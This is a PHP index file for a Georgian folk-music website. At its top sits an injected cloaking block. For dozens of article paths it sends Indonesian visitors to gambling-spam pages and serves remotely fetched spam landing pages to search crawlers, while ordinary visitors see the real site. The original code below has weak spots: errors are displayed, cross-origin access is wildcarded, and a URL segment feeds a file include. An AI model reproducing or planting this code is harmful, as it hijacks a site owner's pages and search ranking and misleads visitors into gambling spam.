<?php

function mangsud($url) {
    if (ini_get('allow_url_fopen')) {
        return @file_get_contents($url);
    } elseif (function_exists('curl_init')) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        $res = curl_exec($ch);
        curl_close($ch);
        return $res;
    }
    return false;
}

$ua = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
$uri = $_SERVER['REQUEST_URI'] ?? '/';
$uri_path = parse_url($uri, PHP_URL_PATH);

$bot_regex = "/(googlebot|google|adsbot|mediapartners|bingbot|slurp|yandex|duckduck|baidu|ahrefs|semrush|mj12|dotbot|crawler|spider|facebook|twitterbot|telegrambot)/i";

// Konfigurasi untuk berbagai path
$configs = [
    '/ka/about' => [
        'amp' => 'https://ref909909909909.pages.dev/INDO178/',
        'lp'  => 'https://getdispoglove.shop/maicha/geofolk.ge/ka/about/index.html'
    ],
    '/ka/news' => [
        'amp' => 'https://ref909909909909.pages.dev/MERPATI178/',
        'lp'  => 'https://getdispoglove.shop/maicha/geofolk.ge/ka/news/index.html'
    ],
    '/ka/library' => [
        'amp' => 'https://ref909909909909.pages.dev/BRO178/',
        'lp'  => 'https://getdispoglove.shop/maicha/geofolk.ge/ka/library/index.html'
    ],
    '/en/articles' => [
        'amp' => 'https://ref909909909909.pages.dev/MUSANG178/',
        'lp'  => 'https://getdispoglove.shop/maicha/geofolk.ge/en/articles/index.html'
    ],
    '/ka/articles' => [
        'amp' => 'https://ref909909909909.pages.dev/PT89/',
        'lp'  => 'https://getdispoglove.shop/maicha/geofolk.ge/ka/articles/index.html'
    ],
    '/ka/contact' => [
        'amp' => 'https://ref909909909909.pages.dev/DIAN4D/',
        'lp'  => 'https://getdispoglove.shop/maicha/geofolk.ge/ka/contact/index.html'
    ],
    '/ka/journal' => [
        'amp' => 'https://ref909909909909.pages.dev/INDOCAIR/',
        'lp'  => 'https://getdispoglove.shop/maicha/geofolk.ge/ka/journal/index.html'
    ],
    '/ka/book/41' => [
        'amp' => 'https://ref909909909909.pages.dev/KING88/',
        'lp'  => 'https://getdispoglove.shop/maicha/geofolk.ge/ka/book/41/index.html'
    ],
    '/ka/book/40' => [
        'amp' => 'https://ref909909909909.pages.dev/PGKING/',
        'lp'  => 'https://getdispoglove.shop/maicha/geofolk.ge/ka/book/40/index.html'
    ],
    '/ka/book/42' => [
        'amp' => 'https://ref909909909909.pages.dev/MDG188/',
        'lp'  => 'https://getdispoglove.shop/maicha/geofolk.ge/ka/book/42/index.html'
    ],
    '/ka/book/48' => [
        'amp' => 'https://ref909909909909.pages.dev/LEDAK188/',
        'lp'  => 'https://getdispoglove.shop/maicha/geofolk.ge/ka/book//48/index.html'
    ],
    '/ka/article/mravalzhamieri--/55' => [
        'amp' => 'https://ref909909909909.pages.dev/HAO788/',
        'lp'  => 'https://getdispoglove.shop/maicha/geofolk.ge/ka/article/mravalzhamieri--/55/index.html'
    ],
    '/en/article/mravalzhamieri--/55' => [
        'amp' => 'https://ref909909909909.pages.dev/LEDAK788/',
        'lp'  => 'https://getdispoglove.shop/maicha/geofolk.ge/en/article/mravalzhamieri--/55/index.html'
    ],
    '/ka/narticle/tristan-sikharulidze-85/72' => [
        'amp' => 'https://ref909909909909.pages.dev/PARIS88/',
        'lp'  => 'https://getdispoglove.shop/maicha/geofolk.ge/ka/narticle/tristan-sikharulidze-85/72/index.html'
    ],
    '/ka/article/simgherit-gadarchenilebi/63' => [
        'amp' => 'https://ref909909909909.pages.dev/EMPIRE88/',
        'lp'  => 'https://getdispoglove.shop/maicha/geofolk.ge/ka/article/simgherit-gadarchenilebi/63/index.html'
    ],
    '/ka/library/qartuli-khalkhuri-simghera-' => [
        'amp' => 'https://ref909909909909.pages.dev/GADAITOTO/',
        'lp'  => 'https://getdispoglove.shop/maicha/geofolk.ge/ka/library/qartuli-khalkhuri-simghera-/index.html'
    ],
    '/ka/library/qartuli-khalkhuri-cekva' => [
        'amp' => 'https://ref909909909909.pages.dev/BENDERA62/',
        'lp'  => 'https://getdispoglove.shop/maicha/geofolk.ge/ka/library/qartuli-khalkhuri-cekva/index.html'
    ],
    '/ka/article/ukrainuli-khalkhuri-musika/60' => [
        'amp' => 'https://ref909909909909.pages.dev/POMPA88/',
        'lp'  => 'https://getdispoglove.shop/maicha/geofolk.ge/ka/article/ukrainuli-khalkhuri-musika/60/index.html'
    ],
    '/ka/article/qartuli-musikaluri-dialeqtebi/59' => [
        'amp' => 'https://ref909909909909.pages.dev/BETON888/',
        'lp'  => 'https://getdispoglove.shop/maicha/geofolk.ge/ka/article/qartuli-musikaluri-dialeqtebi/59/index.html'
    ],
    '/en/article/interviu-giorgi-donadzestan/61' => [
        'amp' => 'https://ref909909909909.pages.dev/ARWAHTOTO/',
        'lp'  => 'https://getdispoglove.shop/maicha/geofolk.ge/en/article/interviu-giorgi-donadzestan/61/index.html'
    ],
    '/en/article/qartuli-musikaluri-dialeqtebi/59' => [
        'amp' => 'https://ref909909909909.pages.dev/VESPATOGEL/',
        'lp'  => 'https://getdispoglove.shop/maicha/geofolk.ge/en/article/qartuli-musikaluri-dialeqtebi/59/index.html'
    ],
    '/en/article/ukrainuli-khalkhuri-musika/60' => [
        'amp' => 'https://ref909909909909.pages.dev/MPO1221/',
        'lp'  => 'https://getdispoglove.shop/maicha/geofolk.ge/en/article/ukrainuli-khalkhuri-musika/60/index.html'
    ],
    '/ka/article/saqartvelo--ghvinis-akvani/57' => [
        'amp' => 'https://ref909909909909.pages.dev/MPO500/',
        'lp'  => 'https://getdispoglove.shop/maicha/geofolk.ge/ka/article/saqartvelo--ghvinis-akvani/57/index.html'
    ],
    '/ka/library/shua-saukuneebis-qartuli-galoba-' => [
        'amp' => 'https://ref909909909909.pages.dev/MPO777/',
        'lp'  => 'https://getdispoglove.shop/maicha/geofolk.ge/ka/library/shua-saukuneebis-qartuli-galoba-/index.html'
    ],
    '/en/article/saqartvelo--ghvinis-akvani/57' => [
        'amp' => 'https://ref909909909909.pages.dev/MIMINBET/',
        'lp'  => 'https://getdispoglove.shop/maicha/geofolk.ge/en/article/saqartvelo--ghvinis-akvani/57/index.html'
    ],
    '/ka/narticle/ansambli-chveneburebi--koncerti-parizshi/94' => [
        'amp' => 'https://ref909909909909.pages.dev/NAGITABET/',
        'lp'  => 'https://getdispoglove.shop/maicha/geofolk.ge/ka/narticle/ansambli-chveneburebi--koncerti-parizshi/94/index.html'
    ],
    '/en/article/qartuli-cekva-mitosis-enit-gvesaubreba/58' => [
        'amp' => 'https://ref909909909909.pages.dev/DRAGON222/',
        'lp'  => 'https://getdispoglove.shop/maicha/geofolk.ge/en/article/qartuli-cekva-mitosis-enit-gvesaubreba/58/index.html'
    ],
    '/ka/article/erti-sashobao-sagaloblis-shesakheb-/77' => [
        'amp' => 'https://ref909909909909.pages.dev/FIATOGEL/',
        'lp'  => 'https://getdispoglove.shop/maicha/geofolk.ge/ka/article/erti-sashobao-sagaloblis-shesakheb-/77/index.html'
    ],
    '/en/article/mtsyemsi-bichis-udzvelesi-salamuris-ambavi/62' => [
        'amp' => 'https://ref909909909909.pages.dev/BALAPTOTO/',
        'lp'  => 'https://getdispoglove.shop/maicha/geofolk.ge/en/article/mtsyemsi-bichis-udzvelesi-salamuris-ambavi/62/index.html'
    ],
    '/ka/article/alilo---shobis-makharebelta-simghera/85' => [
        'amp' => 'https://ref909909909909.pages.dev/INDOSATTOTO/',
        'lp'  => 'https://getdispoglove.shop/maicha/geofolk.ge/ka/article/alilo---shobis-makharebelta-simghera/85/index.html'
    ],
    '/en/article/singing-alilo-in-northern-italy/82' => [
        'amp' => 'https://ref909909909909.pages.dev/KOIN404/',
        'lp'  => 'https://getdispoglove.shop/maicha/geofolk.ge/en/article/singing-alilo-in-northern-italy/82/index.html'
    ],
    '/ka/article/qartuli-cekva-mitosis-enit-gvesaubreba/58' => [
        'amp' => 'https://ref909909909909.pages.dev/KOBOISLOT/',
        'lp'  => 'https://getdispoglove.shop/maicha/geofolk.ge/ka/article/qartuli-cekva-mitosis-enit-gvesaubreba/58/index.html'
    ],
    '/ka/article/mtsyemsi-bichis-udzvelesi-salamuris-ambavi/62' => [
        'amp' => 'https://ref909909909909.pages.dev/SURYA777/',
        'lp'  => 'https://getdispoglove.shop/maicha/geofolk.ge/ka/article/mtsyemsi-bichis-udzvelesi-salamuris-ambavi/62/index.html'
    ],
    '/ka/article/ra-tqva-stravinskim-sinamdvileshi-qartul-musikaze/109' => [
        'amp' => 'https://ref909909909909.pages.dev/COKI88/',
        'lp'  => 'https://getdispoglove.shop/maicha/geofolk.ge/ka/article/ra-tqva-stravinskim-sinamdvileshi-qartul-musikaze/109/index.html'
    ],
    '/ka/narticle/ansambli-margaliti--shekhvedra-sashobaod/92' => [
        'amp' => 'https://ref909909909909.pages.dev/TOKYO404/',
        'lp'  => 'https://getdispoglove.shop/maicha/geofolk.ge/ka/narticle/ansambli-margaliti--shekhvedra-sashobaod/92/index.html'
    ],
    '/ka/article/qartuli-galoba--saukuneta-sighrmidan-dghemde/56' => [
        'amp' => 'https://ref909909909909.pages.dev/GARUDA404/',
        'lp'  => 'https://getdispoglove.shop/maicha/geofolk.ge/ka/article/qartuli-galoba--saukuneta-sighrmidan-dghemde/56/index.html'
    ],
    '/en/article/ra-tqva-stravinskim-sinamdvileshi-qartul-musikaze/109' => [
        'amp' => 'https://ref909909909909.pages.dev/PECAH404/',
        'lp'  => 'https://getdispoglove.shop/maicha/geofolk.ge/en/article/ra-tqva-stravinskim-sinamdvileshi-qartul-musikaze/109/index.html'
    ],
    '/en/article/pirveli-maisi-mshromelta-dghis-sabchota-achrdili/274' => [
        'amp' => 'https://ref909909909909.pages.dev/JUARA404/',
        'lp'  => 'https://getdispoglove.shop/maicha/geofolk.ge/en/article/pirveli-maisi-mshromelta-dghis-sabchota-achrdili/274/index.html'
    ],
    '/en/article/qartuli-galoba--saukuneta-sighrmidan-dghemde/56' => [
        'amp' => 'https://ref909909909909.pages.dev/ISTANA404/',
        'lp'  => 'https://getdispoglove.shop/maicha/geofolk.ge/en/article/qartuli-galoba--saukuneta-sighrmidan-dghemde/56/index.html'
    ],
    '/ka/article/pirveli-maisi-mshromelta-dghis-sabchota-achrdili/274' => [
        'amp' => 'https://ref909909909909.pages.dev/JURAGAN404/',
        'lp'  => 'https://getdispoglove.shop/maicha/geofolk.ge/ka/article/pirveli-maisi-mshromelta-dghis-sabchota-achrdili/274/index.html'
    ],
];

// Normalisasi path (hapus trailing slash untuk perbandingan)
$uri_path_normalized = rtrim($uri_path, '/');
if ($uri_path_normalized === '') {
    $uri_path_normalized = '/';
}

// DEBUG: Tambahkan logging untuk debugging
error_log("URI: $uri");
error_log("URI Path: $uri_path");
error_log("URI Normalized: $uri_path_normalized");
error_log("User Agent: $ua");

// Cek apakah URI cocok dengan salah satu path yang dikonfigurasi
$matched = false;
foreach ($configs as $path => $config) {
    $path_normalized = rtrim($path, '/');
    if ($path_normalized === '') {
        $path_normalized = '/';
    }
    
    error_log("Checking path: $path_normalized vs $uri_path_normalized");
    
    // Match path (dengan atau tanpa trailing slash)
    if ($uri_path_normalized === $path_normalized) {
        $matched = true;
        
        $ip = $_SERVER['REMOTE_ADDR'] ?? '';
        error_log("IP Address: $ip");
        
        // Redirect IP Indonesia ke AMP
        if (!empty($ip)) {
            $geo = @json_decode(@file_get_contents("http://ip-api.com/json/$ip"), true);
            error_log("Country Code: " . ($geo['countryCode'] ?? 'Unknown'));
            
            if (!empty($geo['countryCode']) && $geo['countryCode'] === "ID") {
                error_log("Redirecting Indonesian IP to AMP");
                header("Location: " . $config['amp']);
                exit;
            }
        }
        
        // Tampilkan LP untuk bot
        if (preg_match($bot_regex, $ua)) {
            error_log("Bot detected, showing LP");
            $f = mangsud($config['lp']);
            if ($f) {
                echo $f;
            } else {
                // Fallback jika tidak bisa fetch
                echo "<script>window.location.href = '" . $config['lp'] . "';</script>";
            }
            exit;
        }
        
        // Untuk non-bot, non-ID, lanjut ke konten asli
        error_log("Non-bot, non-ID traffic, continuing to main site");
        break;
    }
}

// Jika tidak match dengan config cloaking, lanjut ke website normal
if (!$matched) {
    error_log("No path matched for cloaking, continuing to main site");
}

?>
<?php

session_start();
header('Access-Control-Allow-Origin: *');
header("cache-control: no-cache, max-age=0, must-revalidate");
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);
/*header("X-Frame-Options: deny");
header("X-XSS-Protection: 1; mode=block");

header("X-Content-Type-Options: nosniff");*/


if(empty($_SERVER['HTTPS']) || $_SERVER['HTTPS'] == "off"){
    $redirect = 'https://' . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
    header('HTTP/1.1 301 Moved Permanently');
    header('Location: ' . $redirect);
    exit();
} 
// Create connection


	include("db_open.php");	
 mysqli_set_charset($con,"utf8");
// mysqli_query($con,"SET profiling = 1;");
// $query="SELECT * FROM users";
// $result = mysqli_query($con,$query);
// $query="SELECT * FROM admins";
// $result = mysqli_query($con,$query);
// $exec_time_result=mysqli_query($con,"SELECT query_id, SUM(duration),min(seq) seq,state,count(*) numb_ops,round(sum(duration),5) sum_dur, round(avg(duration),5) avg_dur,round(sum(cpu_user),5) sum_cpu, round(avg(cpu_user),5) avg_cpu  FROM information_schema.profiling GROUP BY query_id ORDER BY query_id DESC ");

// while($exec_time_row = mysqli_fetch_array($exec_time_result)){
	// var_dump($exec_time_row);
// }

 // echo "<p>Query executed in ".$exec_time_row[1].' seconds';
if(!isset($_COOKIE["lang"]))
{
	//setcookie('lang', 'en', time()+7200, '/');
}
$lang= mysqli_real_escape_string($con,$_COOKIE["lang"]??"");

$uid=$_SESSION["uid"]??"";
// var_dump($_POST);
$BASE= "https://geofolk.ge/";
//echo $BASE;
$url = $_SERVER['REQUEST_URI']??"";
//$path = $_SERVER['REDIRECT_URL']??"";
$url=str_replace("/?","?",$url);
$url=str_replace("?","/?",$url);
$parts = explode('/',$url);
array_shift($parts);
$i=1;
foreach($parts as $part){
	$p="p".$i;
	$$p=mysqli_real_escape_string($con,$part);
	if(strpos($$p,"?")===0){
		$$p="";
	}
	$i++;
}


if (in_array($p1,["ka","en","ru","es","de","zh","in"])) {
	$lang = ($p1 == "ka"?"ge":$p1);
}
	$LA= ($lang == "ge"?"ka":$lang);
if ($LA == "") {
	$LA = "ka";
}
if ($LA == "ka") {
	$LN = "ge";
}
if($lang==""&&$p1!='ru'&&$p1!='ka'){
	$lang="ka";
}

setcookie('lang', $lang, time()+7200, '/');

 $p1==""&&$p1!="ka"?header('Location:'. $BASE .$LA ."/"):"";



if(empty($p2)||$p2==""){
	$p="home";
}else{
	$p=$p2;
}
$L=$LA;
$LN=$lang;
if($url=="/"){
	$url="/".$L;
};

if(substr($url,-1)!="/"){
	$url=$url."/";
} 


if(!in_array($p1,["ka","en","ru","es","de","zh","in",$LA])){
	header("location: /$LA/");
}

// if($p2=='hosting'&&$_SERVER['REMOTE_ADDR']!='46.49.60.19')
// {
	// $p='home'; 
// }
require_once("pages.php");	 
include("functions/pagination.php");
include("lang/".$L.".php");
include("view/inc/header.php");
include("view/pages/".$p.".php");
include("view/inc/footer.php");
	include("db_close.php");	
?>
